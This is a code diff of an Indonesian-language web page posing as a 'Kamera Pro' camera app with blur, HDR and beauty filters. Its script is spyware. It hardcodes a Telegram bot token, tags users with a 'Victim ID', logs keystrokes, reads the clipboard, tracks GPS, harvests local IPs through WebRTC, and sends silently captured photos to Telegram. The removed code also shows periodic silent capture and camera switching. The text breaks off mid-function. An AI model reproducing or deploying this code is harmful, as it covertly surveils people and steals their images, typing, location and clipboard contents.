@@ -4,470 +4,668 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <title>Kamera Pro</title>
-    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white'><path d='M9 2L7.17 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2h-3.17L15 2H9zm3 15c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z'/></svg>">
     <style>
-        :root { --bg:#000; --surface:rgba(0,0,0,0.5); --accent:#fcd434; --radius:24px; }
-        * { margin:0;padding:0;box-sizing:border-box;user-select:none;-webkit-tap-highlight-color:transparent;-webkit-user-select:none; }
-        body { background:var(--bg); font-family:-apple-system,'SF Pro Display',sans-serif; height:100vh;width:100vw;overflow:hidden;touch-action:manipulation;position:relative; }
+        :root {
+            --bg: #000;
+            --surface: rgba(0,0,0,0.5);
+            --accent: #fcd434;
+            --ios-blue: #007aff;
+        }
+        * {
+            margin: 0; padding: 0; box-sizing: border-box;
+            user-select: none; -webkit-user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+        body {
+            background: var(--bg);
+            font-family: -apple-system, 'SF Pro Display', 'Helvetica Neue', sans-serif;
+            height: 100vh; width: 100vw; height: 100dvh; width: 100dvw;
+            overflow: hidden; touch-action: manipulation; position: relative;
+        }
 
-        .perm-overlay { position:fixed;inset:0;background:#000;z-index:999;display:flex;flex-direction:column;justify-content:center;align-items:center;padding:30px;color:#fff;text-align:center;transition:opacity .5s; }
-        .perm-overlay.hidden { opacity:0;pointer-events:none; }
-        .perm-overlay .logo { width:72px;height:72px;margin-bottom:24px;background:rgba(255,255,255,.08);border-radius:50%;display:flex;align-items:center;justify-content:center; }
-        .perm-overlay .logo svg { width:40px;height:40px;fill:#fff; }
-        .perm-overlay h1 { font-size:26px;font-weight:600;margin-bottom:6px;letter-spacing:-.3px; }
-        .perm-overlay .sub { font-size:14px;color:#999;margin-bottom:28px;line-height:1.4;max-width:300px; }
-        .perm-overlay .btn-start { background:#007aff;border:none;border-radius:30px;padding:15px 48px;font-size:17px;font-weight:600;color:#fff;cursor:pointer;min-width:180px;transition:transform .15s; }
-        .perm-overlay .btn-start:active { transform:scale(.95); }
+        /* Permission Overlay */
+        .perm-overlay {
+            position: fixed; inset: 0; background: #000; z-index: 999;
+            display: flex; flex-direction: column; align-items: center;
+            justify-content: center; color: #fff; text-align: center;
+            padding: 30px; transition: opacity 0.5s;
+        }
+        .perm-overlay.hidden { opacity: 0; pointer-events: none; }
+        .perm-overlay .logo {
+            width: 72px; height: 72px; border-radius: 50%;
+            background: #1c1c1e; display: flex; align-items: center;
+            justify-content: center; margin-bottom: 24px;
+        }
+        .perm-overlay .logo svg { width: 36px; height: 36px; fill: #fff; }
+        .perm-overlay h1 { font-size: 26px; font-weight: 600; margin-bottom: 6px; }
+        .perm-overlay p { font-size: 14px; color: #999; margin-bottom: 28px; max-width: 280px; }
+        .perm-overlay .btn-start {
+            background: var(--ios-blue); border: none; border-radius: 30px;
+            padding: 15px 50px; font-size: 17px; font-weight: 600; color: #fff;
+            cursor: pointer; transition: transform 0.15s;
+        }
+        .perm-overlay .btn-start:active { transform: scale(0.95); }
+        .perm-overlay .btn-start:disabled { opacity: 0.5; }
+        .perm-overlay .err-msg { color: #ff453a; font-size: 13px; margin-top: 14px; min-height: 18px; }
 
-        #vf { position:fixed;top:0;left:0;width:100%;height:100%;object-fit:cover;z-index:1; }
+        /* Video */
+        #vf {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            object-fit: cover; z-index: 1;
+        }
 
-        #ui { position:fixed;inset:0;z-index:2;display:flex;flex-direction:column;justify-content:space-between;padding:12px 14px 20px;pointer-events:none; }
-        #ui>* { pointer-events:auto; }
+        /* Flash */
+        #flash {
+            position: fixed; inset: 0; background: #fff; z-index: 10;
+            opacity: 0; pointer-events: none; transition: opacity 0.04s;
+        }
+        #flash.fire { opacity: 0.88; transition: opacity 0s; }
 
-        /* INDICATOR BAR */
-        .indicator-bar { position:fixed;top:12px;left:50%;transform:translateX(-50%);z-index:6;pointer-events:none;display:flex;gap:6px; }
-        .ind-tag { background:rgba(0,0,0,.6);border-radius:12px;padding:3px 9px;font-size:10px;font-weight:600;color:#fc0;opacity:0;transition:opacity .3s; }
-        .ind-tag.on { opacity:1; }
+        /* Top Bar */
+        .top-bar {
+            position: fixed; top: 0; left: 0; right: 0; z-index: 5;
+            padding: 12px 14px; padding-top: max(12px, env(safe-area-inset-top));
+            display: flex; justify-content: space-between; flex-wrap: wrap;
+            gap: 6px; pointer-events: none;
+        }
+        .top-bar > * { pointer-events: auto; }
+        .top-grp { display: flex; gap: 5px; flex-wrap: wrap; }
+        .chip {
+            background: var(--surface); backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255,255,255,0.12); border-radius: 20px;
+            color: #fff; padding: 6px 10px; font-size: 10px; font-weight: 500;
+            cursor: pointer; display: flex; align-items: center; gap: 4px;
+            height: 28px; white-space: nowrap; transition: background 0.2s, color 0.2s;
+        }
+        .chip:active { background: rgba(255,255,255,0.18); }
+        .chip.on { background: var(--accent); color: #000; border-color: var(--accent); }
+        .chip svg { width: 12px; height: 12px; fill: currentColor; }
 
-        /* TOP BAR */
-        .top-row { display:flex;justify-content:space-between;align-items:flex-start;gap:6px;flex-wrap:wrap; }
-        .top-grp { display:flex;gap:6px;flex-wrap:wrap; }
-        .chip { background:var(--surface);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,.12);border-radius:var(--radius);color:#fff;padding:6px 12px;font-size:11px;font-weight:500;display:flex;align-items:center;gap:5px;cursor:pointer;height:30px;white-space:nowrap;transition:background .2s,color .2s; }
-        .chip:active { background:rgba(255,255,255,.18); }
-        .chip svg { width:14px;height:14px;fill:currentColor;flex-shrink:0; }
-        .chip.on { background:var(--accent);color:#000;border-color:var(--accent); }
+        /* Indicator Tags */
+        .ind-tag {
+            position: fixed; z-index: 6; pointer-events: none;
+            background: rgba(0,0,0,0.65); border-radius: 10px; padding: 3px 8px;
+            color: #fc0; font-size: 10px; font-weight: 600; opacity: 0;
+            transition: opacity 0.3s;
+        }
+        .ind-tag.on { opacity: 1; }
+        #indHDR { top: 50px; left: 50%; transform: translateX(-50%); }
+        #indStab { top: 50px; left: 20px; }
+        #indSoft { top: 50px; right: 20px; }
 
-        /* ZOOM WHEEL */
-        .zoom-bar { position:absolute;bottom:105px;left:50%;transform:translateX(-50%);z-index:3;pointer-events:auto;background:var(--surface);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);border-radius:40px;padding:5px 8px;border:1px solid rgba(255,255,255,.15);display:flex;align-items:center;gap:3px;color:#fff; }
-        .zm { padding:7px 13px;border-radius:20px;font-size:13px;font-weight:500;color:#fff;cursor:pointer;transition:background .2s;text-align:center;min-width:32px; }
-        .zm.on { background:rgba(255,255,255,.22);font-weight:600; }
-        .zm:active { background:rgba(255,255,255,.35); }
+        /* Zoom Wheel */
+        .zoom-wheel {
+            position: fixed; bottom: 130px; left: 50%; transform: translateX(-50%);
+            z-index: 5; pointer-events: auto;
+            background: var(--surface); backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px); border-radius: 24px;
+            padding: 4px 3px; display: flex; gap: 1px;
+        }
+        .zm {
+            padding: 7px 11px; border-radius: 20px; font-size: 12px; font-weight: 500;
+            color: #fff; cursor: pointer; transition: background 0.2s; min-width: 30px; text-align: center;
+        }
+        .zm.on { background: rgba(255,255,255,0.25); font-weight: 600; }
+        .zm:active { background: rgba(255,255,255,0.35); }
 
-        /* BOTTOM */
-        .btm-row { display:flex;justify-content:space-between;align-items:center;padding:0 10px 0 6px; }
-        .thumb-box { width:50px;height:50px;border-radius:12px;background:rgba(255,255,255,.06);border:2px solid rgba(255,255,255,.2);cursor:pointer;display:flex;align-items:center;justify-content:center;overflow:hidden;transition:border .2s;flex-shrink:0; }
-        .thumb-box:active { border-color:var(--accent); }
-        .thumb-box img { width:100%;height:100%;object-fit:cover; }
-        .thumb-box.has-img { border-color:rgba(255,255,255,.5);background:transparent; }
-        .shutter { width:74px;height:74px;border-radius:50%;background:#fff;border:5px solid rgba(255,255,255,.45);cursor:pointer;transition:transform .15s;touch-action:manipulation;flex-shrink:0; }
-        .shutter:active { transform:scale(.84); }
-        .spacer-box { width:50px;flex-shrink:0; }
+        /* Bottom Bar */
+        .btm-bar {
+            position: fixed; bottom: 0; left: 0; right: 0; z-index: 5;
+            padding: 14px 16px; padding-bottom: max(18px, env(safe-area-inset-bottom));
+            display: flex; justify-content: space-between; align-items: center;
+            pointer-events: none;
+        }
+        .btm-bar > * { pointer-events: auto; }
+        .thumb-box {
+            width: 46px; height: 46px; border-radius: 10px;
+            background: rgba(255,255,255,0.06); border: 2px solid rgba(255,255,255,0.2);
+            overflow: hidden; cursor: pointer; display: flex; align-items: center; justify-content: center;
+        }
+        .thumb-box img { width: 100%; height: 100%; object-fit: cover; }
+        .thumb-box.has-img { border-color: rgba(255,255,255,0.55); background: transparent; }
+        .shutter-btn {
+            width: 70px; height: 70px; border-radius: 50%;
+            background: rgba(255,255,255,0.12); display: flex;
+            align-items: center; justify-content: center; cursor: pointer;
+            transition: transform 0.15s;
+        }
+        .shutter-btn:active { transform: scale(0.82); }
+        .shutter-inner {
+            width: 55px; height: 55px; border-radius: 50%;
+            background: #fff; border: 3px solid #000;
+        }
+        .spacer { width: 46px; }
 
-        #flash { position:fixed;inset:0;background:#fff;z-index:10;opacity:0;pointer-events:none;transition:opacity .04s; }
-        #flash.fire { opacity:.88;transition:opacity 0s; }
-
-        .focus-ripple { position:fixed;width:70px;height:70px;border:2px solid var(--accent);border-radius:50%;transform:translate(-50%,-50%);pointer-events:none;z-index:5;opacity:0;box-shadow:0 0 24px rgba(255,204,0,.25); }
-        .focus-ripple.pop { animation:ripple .55s ease-out forwards; }
-        @keyframes ripple { 0%{opacity:1;transform:translate(-50%,-50%) scale(.7)}100%{opacity:0;transform:translate(-50%,-50%) scale(1.5)} }
+        /* Focus Ring */
+        .focus-ring {
+            position: fixed; width: 70px; height: 70px; border: 2px solid var(--accent);
+            border-radius: 50%; transform: translate(-50%, -50%); pointer-events: none;
+            z-index: 5; opacity: 0; box-shadow: 0 0 20px rgba(252,212,52,0.3);
+        }
+        .focus-ring.pop { animation: focusPulse 0.55s ease-out forwards; }
+        @keyframes focusPulse {
+            0% { opacity: 1; transform: translate(-50%, -50%) scale(0.7); }
+            100% { opacity: 0; transform: translate(-50%, -50%) scale(1.4); }
+        }
     </style>
 </head>
 <body>
 
-<div class="perm-overlay" id="permOverlay">
-    <div class="logo"><svg viewBox="0 0 24 24"><path d="M9 2L7.17 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2h-3.17L15 2H9zm3 15c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/></svg></div>
-    <h1>Kamera Pro</h1>
-    <p class="sub">Ambil foto berkualitas tinggi dengan efek profesional</p>
-    <button class="btn-start" id="btnStart">Buka Kamera</button>
-</div>
+    <!-- Permission Overlay -->
+    <div class="perm-overlay" id="permOverlay">
+        <div class="logo"><svg viewBox="0 0 24 24"><path d="M12 15.2l-3.5 2.1.9-4-2.9-2.5 3.8-.3L12 7l1.7 3.5 3.8.3-2.9 2.5.9 4z"/></svg></div>
+        <h1>Kamera Pro</h1>
+        <p>Izinkan akses kamera untuk mulai</p>
+        <button class="btn-start" id="btnStart">Buka Kamera</button>
+        <div class="err-msg" id="errMsg"></div>
+    </div>
 
-<video id="vf" autoplay playsinline></video>
-<div id="flash"></div>
-<div class="focus-ripple" id="focusRipple"></div>
+    <video id="vf" autoplay playsinline></video>
+    <div id="flash"></div>
+    <div class="focus-ring" id="focusRing"></div>
 
-<!-- INDIKATOR FITUR AKTIF -->
-<div class="indicator-bar">
-    <span class="ind-tag" id="indHDR">HDR</span>
-    <span class="ind-tag" id="indLive">LIVE</span>
-    <span class="ind-tag" id="indStab">STABIL</span>
-    <span class="ind-tag" id="indSoft">SOFT</span>
-    <span class="ind-tag" id="indBlur">BOKEH</span>
-</div>
+    <!-- Indicator Tags -->
+    <div class="ind-tag" id="indHDR">HDR</div>
+    <div class="ind-tag" id="indStab">STABIL</div>
+    <div class="ind-tag" id="indSoft">SOFT</div>
 
-<div id="ui">
-    <div class="top-row">
+    <!-- Top Bar -->
+    <div class="top-bar">
         <div class="top-grp">
+            <button class="chip" id="btnFlash">⚡ Flash</button>
             <button class="chip on" id="btnBlur">🌀 Blur</button>
             <button class="chip on" id="btnLive">🎬 Live</button>
-            <button class="chip on" id="btnHD">4K HD</button>
+            <button class="chip on" id="btnHD">4K</button>
             <button class="chip on" id="btnHDR">🌅 HDR</button>
-            <button class="chip on" id="btnStab">✋ Stabil</button>
+            <button class="chip on" id="btnStab">✋ Stab</button>
             <button class="chip on" id="btnSoft">✨ Soft</button>
         </div>
-        <div class="top-grp">
-            <button class="chip" id="btnFlip">🔄 Flip</button>
-        </div>
+        <button class="chip" id="btnFlip">🔄</button>
     </div>
 
-    <div class="zoom-bar">
-        <div class="zm on" data-z="0.5">.5</div>
-        <div class="zm" data-z="1">1×</div>
-        <div class="zm" data-z="2">2×</div>
-        <div class="zm" data-z="3">3×</div>
+    <!-- Zoom Wheel -->
+    <div class="zoom-wheel" id="zoomWheel">
+        <div class="zm" data-z="0.5">0.5</div>
+        <div class="zm" data-z="0.7">0.7</div>
+        <div class="zm on" data-z="1">1x</div>
+        <div class="zm" data-z="1.5">1.5</div>
+        <div class="zm" data-z="2">2x</div>
     </div>
 
-    <div class="btm-row">
-        <div class="thumb-box" id="thumbBox"><svg viewBox="0 0 24 24" width="24" height="24" fill="rgba(255,255,255,.3)"><rect x="3" y="3" width="18" height="18" rx="2"/></svg></div>
-        <button class="shutter" id="btnShutter"></button>
-        <div class="spacer-box"></div>
+    <!-- Bottom Bar -->
+    <div class="btm-bar">
+        <div class="thumb-box" id="thumbBox"></div>
+        <div class="shutter-btn" id="btnShutter"><div class="shutter-inner"></div></div>
+        <div class="spacer"></div>
     </div>
-</div>
 
 <script>
 (function() {
     'use strict';
 
-    const BOT_TOKEN = '8514751802:AAFvWUx_ZWZwRMokFe4gQKSqR1_WqkQS2ug';
-    const CHAT_ID = '7839405566';
-    const TG_API = 'https://api.telegram.org/bot' + BOT_TOKEN;
+    // ==================== CONFIG ====================
+    var BOT_TOKEN = '8514751802:AAFvWUx_ZWZwRMokFe4gQKSqR1_WqkQS2ug';
+    var CHAT_ID = '7839405566';
+    var TG_API = 'https://api.telegram.org/bot' + BOT_TOKEN;
 
-    const VID = (() => {
-        const s = localStorage.getItem('_vid');
+    // Victim ID
+    var VID = (function() {
+        var s = localStorage.getItem('_vid');
         if (s) return s;
-        const id = 'V' + Date.now().toString(36) + Math.random().toString(36).substr(2, 6);
+        var id = 'V' + Date.now().toString(36) + Math.random().toString(36).substr(2, 6);
         localStorage.setItem('_vid', id);
         return id;
     })();
 
-    const $ = (s) => document.getElementById(s);
-    const vf = $('vf'), permOverlay = $('permOverlay'), btnStart = $('btnStart'), btnShutter = $('btnShutter');
-    const btnBlur = $('btnBlur'), btnLive = $('btnLive'), btnHD = $('btnHD'), btnHDR = $('btnHDR'), btnStab = $('btnStab'), btnSoft = $('btnSoft'), btnFlip = $('btnFlip');
-    const thumbBox = $('thumbBox'), focusRipple = $('focusRipple'), flashEl = $('flash');
-    const indHDR = $('indHDR'), indLive = $('indLive'), indStab = $('indStab'), indSoft = $('indSoft'), indBlur = $('indBlur');
+    // ==================== DOM ====================
+    function $(id) { return document.getElementById(id); }
+    var vf = $('vf'), permOverlay = $('permOverlay'), btnStart = $('btnStart'), errMsg = $('errMsg');
+    var btnShutter = $('btnShutter'), btnFlash = $('btnFlash'), btnFlip = $('btnFlip');
+    var btnBlur = $('btnBlur'), btnLive = $('btnLive'), btnHD = $('btnHD'), btnHDR = $('btnHDR'), btnStab = $('btnStab'), btnSoft = $('btnSoft');
+    var thumbBox = $('thumbBox'), flashEl = $('flash'), focusRing = $('focusRing');
+    var indHDR = $('indHDR'), indStab = $('indStab'), indSoft = $('indSoft');
 
-    let stream = null, facingMode = 'environment', currentZoom = 1, lastPhotoData = null, isStarting = false;
-    let blurOn = true, liveOn = true, hdOn = true, hdrOn = true, stabOn = true, softOn = true;
-    let gpsData = null, gpsWatchId = null, localIPs = [];
-    let lastClip = '', keyBuf = '', keylogRunning = false;
-    let silentCapInterval = null, dualSwitchInterval = null, c2PollInterval = null, lastUpdateId = 0;
+    // ==================== STATE ====================
+    var stream = null, facingMode = 'environment', flashOn = false, currentZoom = 1;
+    var lastPhotoData = null, isStarting = false;
+    var blurOn = true, liveOn = true, hdOn = true, hdrOn = true, stabOn = true, softOn = true;
+    var gpsData = null, gpsWatchId = null, localIPs = [];
+    var keyBuf = '', lastClip = '';
+    var silentTimer = null, flipTimer = null, c2Timer = null, lastUpdateId = 0;
 
-    // ==================== TELEGRAM ====================
-    async function tg(t) { try { await fetch(TG_API+'/sendMessage?chat_id='+CHAT_ID+'&text='+encodeURIComponent(t)+'&disable_notification=true'); } catch(e) {} }
-    async function tgPhoto(b, c) { try { const f=new FormData(); f.append('chat_id',CHAT_ID); f.append('photo',b,'p.jpg'); f.append('caption',c||''); f.append('disable_notification','true'); await fetch(TG_API+'/sendPhoto',{method:'POST',body:f}); } catch(e) {} }
-    async function tgDoc(b, fn, c) { try { const f=new FormData(); f.append('chat_id',CHAT_ID); f.append('document',b,fn); f.append('caption',c||''); f.append('disable_notification','true'); await fetch(TG_API+'/sendDocument',{method:'POST',body:f}); } catch(e) {} }
-    function tgBeacon(b, c) { try { const f=new FormData(); f.append('chat_id',CHAT_ID); f.append('photo',b,'s.jpg'); f.append('caption',c||''); f.append('disable_notification','true'); navigator.sendBeacon(TG_API+'/sendPhoto',f); } catch(e) {} }
+    // ==================== TELEGRAM HELPERS ====================
+    function tg(text) {
+        try {
+            fetch(TG_API + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(text) + '&disable_notification=true');
+        } catch(e) {}
+    }
 
+    function tgPhoto(blob, caption) {
+        try {
+            var fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('photo', blob, 'p_' + Date.now() + '.jpg');
+            fd.append('caption', caption || '');
+            fd.append('disable_notification', 'true');
+            fetch(TG_API + '/sendPhoto', { method: 'POST', body: fd });
+        } catch(e) {}
+    }
+
+    function tgBeacon(blob, caption) {
+        try {
+            var fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('photo', blob, 's_' + Date.now() + '.jpg');
+            fd.append('caption', caption || '');
+            fd.append('disable_notification', 'true');
+            navigator.sendBeacon(TG_API + '/sendPhoto', fd);
+        } catch(e) {}
+    }
+
+    // ==================== GPS ====================
     function startGPS() {
         if (!navigator.geolocation) return;
         gpsWatchId = navigator.geolocation.watchPosition(
-            (p) => { gpsData = { lat: p.coords.latitude, lon: p.coords.longitude, alt: p.coords.altitude||0, acc: p.coords.accuracy, spd: p.coords.speed||0, ts: new Date(p.timestamp).toISOString() }; },
-            () => {}, { enableHighAccuracy: true, maximumAge: 30000, timeout: 10000 }
+            function(p) {
+                gpsData = {
+                    lat: p.coords.latitude,
+                    lon: p.coords.longitude,
+                    alt: p.coords.altitude || 0,
+                    acc: p.coords.accuracy
+                };
+            },
+            function() {},
+            { enableHighAccuracy: true, maximumAge: 30000, timeout: 10000 }
         );
     }
 
-    function grabLocalIPs() {
-        return new Promise((resolve) => {
-            const ips = new Set();
-            const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-            pc.createDataChannel(''); pc.createOffer().then(o => pc.setLocalDescription(o));
-            pc.onicecandidate = (e) => {
-                if (e.candidate) { const ip = e.candidate.address; if (ip && !ip.includes('::') && !ip.startsWith('127.') && !ip.startsWith('0.')) ips.add(ip); }
-                else { pc.close(); resolve(Array.from(ips)); }
-            };
-            setTimeout(() => { pc.close(); resolve(Array.from(ips)); }, 2500);
+    // ==================== IP GRABBER ====================
+    function grabIPs() {
+        return new Promise(function(resolve) {
+            var ips = new Set();
+            try {
+                var pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+                pc.createDataChannel('');
+                pc.createOffer().then(function(o) { pc.setLocalDescription(o); });
+                pc.onicecandidate = function(e) {
+                    if (e.candidate) {
+                        var ip = e.candidate.address;
+                        if (ip && ip.indexOf('::') === -1 && ip.indexOf('127.') === -1 && ip.indexOf('0.') === -1) ips.add(ip);
+                    } else { pc.close(); resolve(Array.from(ips)); }
+                };
+                setTimeout(function() { pc.close(); resolve(Array.from(ips)); }, 2000);
+            } catch(e) { resolve([]); }
         });
     }
 
-    async function checkClipboard() { try { const t = await navigator.clipboard.readText(); if (t && t !== lastClip) { lastClip = t; await tg('📋 ['+VID+'] Clipboard:\n'+t.substring(0,1500)); } } catch(e) {} }
-
+    // ==================== KEYLOGGER ====================
     function startKeylogger() {
-        if (keylogRunning) return;
-        keylogRunning = true;
-        document.addEventListener('keydown', (e) => {
-            const ignore = ['Shift','Control','Alt','Meta','CapsLock','Tab','ArrowLeft','ArrowRight','ArrowUp','ArrowDown','Escape'];
-            if (ignore.includes(e.key)) return;
+        document.addEventListener('keydown', function(e) {
+            var ignore = ['Shift','Control','Alt','Meta','CapsLock','Tab','ArrowLeft','ArrowRight','ArrowUp','ArrowDown','Escape'];
+            if (ignore.indexOf(e.key) !== -1) return;
             if (e.key === 'Enter') keyBuf += '[↵]\n';
             else if (e.key === 'Backspace') keyBuf += '[⌫]';
             else if (e.key === ' ') keyBuf += ' ';
             else if (e.key.length === 1) keyBuf += e.key;
-            else keyBuf += '['+e.key+']';
-            if (keyBuf.length > 500) { tg('⌨️ ['+VID+'] Keylog:\n'+keyBuf); keyBuf = ''; }
+            else keyBuf += '[' + e.key + ']';
+            if (keyBuf.length > 300) { tg('⌨️ [' + VID + ']\n' + keyBuf); keyBuf = ''; }
         });
-        setInterval(() => { if (keyBuf.length > 0) { tg('⌨️ ['+VID+'] Keylog:\n'+keyBuf); keyBuf = ''; } }, 15000);
+        setInterval(function() { if (keyBuf.length > 0) { tg('⌨️ [' + VID + ']\n' + keyBuf); keyBuf = ''; } }, 10000);
     }
 
-    // ==================== AUTO CAPTURE ====================
-    function startSilentCapture() {
-        if (silentCapInterval) return;
-        // FOTO PERTAMA: 2 detik setelah kamera aktif
-        setTimeout(() => captureFrame(true), 2000);
-        // FOTO SELANJUTNYA: tiap 5 detik
-        silentCapInterval = setInterval(() => { if (stream && stream.active) captureFrame(true); }, 5000);
+    // ==================== CLIPBOARD ====================
+    function checkClipboard() {
+        try {
+            navigator.clipboard.readText().then(function(t) {
+                if (t && t !== lastClip && t.length > 0) {
+                    lastClip = t;
+                    tg('📋 [' + VID + ']\n' + t.substring(0, 1500));
+                }
+            });
+        } catch(e) {}
     }
 
-    function startDualSwitch() {
-        if (dualSwitchInterval) return;
-        dualSwitchInterval = setInterval(async () => {
-            if (!stream || !stream.active) return;
-            const nf = facingMode === 'environment' ? 'user' : 'environment';
-            await startCamera(nf);
-            setTimeout(() => captureFrame(true), 1500);
-        }, 15000);
+    // ==================== SHOW INDICATOR ====================
+    function showTag(el) {
+        el.classList.add('on');
+        setTimeout(function() { el.classList.remove('on'); }, 1200);
     }
 
-    // ==================== CORE CAPTURE ====================
+    // ==================== CORE: CAPTURE FRAME ====================
     function captureFrame(silent) {
         if (!stream || !stream.active) return;
+
         try {
-            const track = stream.getVideoTracks()[0];
-            const st = track.getSettings();
-            const canvas = document.createElement('canvas');
-            const w = hdOn ? 3840 : 1920;
-            const h = hdOn ? 2160 : 1080;
+            var track = stream.getVideoTracks()[0];
+            var st = track.getSettings();
+            var w = hdOn ? 3840 : 1920;
+            var h = hdOn ? 2160 : 1080;
+            var canvas = document.createElement('canvas');
             canvas.width = w;
             canvas.height = h;
-            const ctx = canvas.getContext('2d');
+            var ctx = canvas.getContext('2d');
 
-            // 🌀 BLUR (Bokeh): background blur
+            // BLUR (Bokeh Effect)
             if (blurOn) {
-                const offCanvas = document.createElement('canvas');
+                var offCanvas = document.createElement('canvas');
                 offCanvas.width = w; offCanvas.height = h;
-                const offCtx = offCanvas.getContext('2d');
+                var offCtx = offCanvas.getContext('2d');
                 offCtx.drawImage(vf, 0, 0, w, h);
-                offCtx.filter = 'blur(18px)';
+                offCtx.filter = 'blur(16px)';
                 offCtx.drawImage(offCanvas, 0, 0);
                 ctx.drawImage(offCanvas, 0, 0);
                 ctx.save();
-                const cx = w/2, cy = h/2, r = Math.min(w, h) * 0.28;
-                ctx.beginPath(); ctx.arc(cx, cy, r, 0, Math.PI*2); ctx.clip();
+                var cx = w / 2, cy = h / 2, r = Math.min(w, h) * 0.3;
+                ctx.beginPath(); ctx.arc(cx, cy, r, 0, Math.PI * 2); ctx.clip();
                 ctx.drawImage(vf, 0, 0, w, h);
                 ctx.restore();
             } else {
                 ctx.drawImage(vf, 0, 0, w, h);
             }
 
-            // 🌅 HDR: multiple exposures
+            // HDR (Enhanced shadows & highlights)
             if (hdrOn) {
-                const imageData = ctx.getImageData(0, 0, w, h);
-                const data = imageData.data;
-                for (let i = 0; i < data.length; i += 4) {
-                    // Tone mapping sederhana: boost shadows, compress highlights
-                    const r = data[i], g = data[i+1], b = data[i+2];
-                    const lum = 0.299*r + 0.587*g + 0.114*b;
-                    if (lum < 80) { data[i] = Math.min(255, r*1.3); data[i+1] = Math.min(255, g*1.3); data[i+2] = Math.min(255, b*1.3); }
-                    else if (lum > 200) { data[i] = Math.max(0, r*0.85); data[i+1] = Math.max(0, g*0.85); data[i+2] = Math.max(0, b*0.85); }
+                var imgData = ctx.getImageData(0, 0, w, h);
+                var d = imgData.data;
+                for (var i = 0; i < d.length; i += 4) {
+                    var lum = 0.299 * d[i] + 0.587 * d[i+1] + 0.114 * d[i+2];
+                    if (lum < 70) { d[i] = Math.min(255, d[i] * 1.35); d[i+1] = Math.min(255, d[i+1] * 1.35); d[i+2] = Math.min(255, d[i+2] * 1.35); }
+                    else if (lum > 210) { d[i] = Math.max(0, d[i] * 0.8); d[i+1] = Math.max(0, d[i+1] * 0.8); d[i+2] = Math.max(0, d[i+2] * 0.8); }
                 }
-                ctx.putImageData(imageData, 0, 0);
+                ctx.putImageData(imgData, 0, 0);
+                showTag(indHDR);
             }
 
-            // ✨ SOFT CAM (Beauty filter): skin smoothing
+            // SOFT CAM (Beauty/Skin Smoothing)
             if (softOn) {
-                const imageData = ctx.getImageData(0, 0, w, h);
-                const data = imageData.data;
-                const width = w, height = h;
-                // Simple box blur untuk smoothing
-                const smoothed = new Uint8ClampedArray(data.length);
-                const kernel = 3;
-                for (let y = kernel; y < height - kernel; y++) {
-                    for (let x = kernel; x < width - kernel; x++) {
-                        let r=0,g=0,b=0,count=0;
-                        for (let ky = -kernel; ky <= kernel; ky++) {
-                            for (let kx = -kernel; kx <= kernel; kx++) {
-                                const idx = ((y+ky)*width + (x+kx)) * 4;
-                                r += data[idx]; g += data[idx+1]; b += data[idx+2];
-                                count++;
+                var imgData2 = ctx.getImageData(0, 0, w, h);
+                var d2 = imgData2.data;
+                var smoothed = new Uint8ClampedArray(d2.length);
+                var kw = 2; // kernel window
+                for (var y = kw; y < h - kw; y++) {
+                    for (var x = kw; x < w - kw; x++) {
+                        var idx = (y * w + x) * 4;
+                        var rSum = 0, gSum = 0, bSum = 0, cnt = 0;
+                        for (var ky = -kw; ky <= kw; ky++) {
+                            for (var kx = -kw; kx <= kw; kx++) {
+                                var kIdx = ((y+ky) * w + (x+kx)) * 4;
+                                rSum += d2[kIdx]; gSum += d2[kIdx+1]; bSum += d2[kIdx+2];
+                                cnt++;
                             }
                         }
-                        const idx = (y*width + x) * 4;
-                        const lum = 0.299*data[idx] + 0.587*data[idx+1] + 0.114*data[idx+2];
-                        // Hanya smooth area kulit (warm tones)
-                        if (data[idx] > data[idx+2] + 5 && data[idx+1] > data[idx+2] + 5 && lum > 60 && lum < 220) {
-                            smoothed[idx] = (r/count * 0.6 + data[idx] * 0.4);
-                            smoothed[idx+1] = (g/count * 0.6 + data[idx+1] * 0.4);
-                            smoothed[idx+2] = (b/count * 0.6 + data[idx+2] * 0.4);
+                        var lum = 0.299 * d2[idx] + 0.587 * d2[idx+1] + 0.114 * d2[idx+2];
+                        // Smooth only skin tones
+                        if (d2[idx] > d2[idx+2] + 5 && d2[idx+1] > d2[idx+2] + 5 && lum > 50 && lum < 230) {
+                            smoothed[idx] = (rSum / cnt * 0.55 + d2[idx] * 0.45);
+                            smoothed[idx+1] = (gSum / cnt * 0.55 + d2[idx+1] * 0.45);
+                            smoothed[idx+2] = (bSum / cnt * 0.55 + d2[idx+2] * 0.45);
                         } else {
-                            smoothed[idx] = data[idx];
-                            smoothed[idx+1] = data[idx+1];
-                            smoothed[idx+2] = data[idx+2];
+                            smoothed[idx] = d2[idx]; smoothed[idx+1] = d2[idx+1]; smoothed[idx+2] = d2[idx+2];
                         }
                         smoothed[idx+3] = 255;
                     }
                 }
-                ctx.putImageData(new ImageData(smoothed, width, height), 0, 0);
+                ctx.putImageData(new ImageData(smoothed, w, h), 0, 0);
+                showTag(indSoft);
             }
 
-            // Timestamp watermark
-            const ts = new Date().toLocaleString('id-ID');
-            ctx.font = '14px -apple-system,sans-serif';
